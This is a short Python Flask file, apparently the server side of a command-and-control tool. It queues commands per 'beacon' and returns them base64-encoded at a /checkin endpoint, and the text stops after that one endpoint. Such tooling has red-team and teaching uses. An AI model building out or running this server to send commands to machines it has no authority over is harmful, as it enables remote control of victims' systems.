# Stephen Graver - server.py
# server side script

from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

# memory store for commands and results
pending_commands = {}
results = {}

@app.route('/checkin/<beacon_id>', methods=['GET'])
def checkin(beacon_id):
# endpoint for beacons to check for commands.
    print(f"[*] Beacon {beacon_id} checked in.")
    cmd = pending_commands.pop(beacon_id, "")
    if cmd:
        return base64.b64encode(cmd.encode()).decode()
    return ""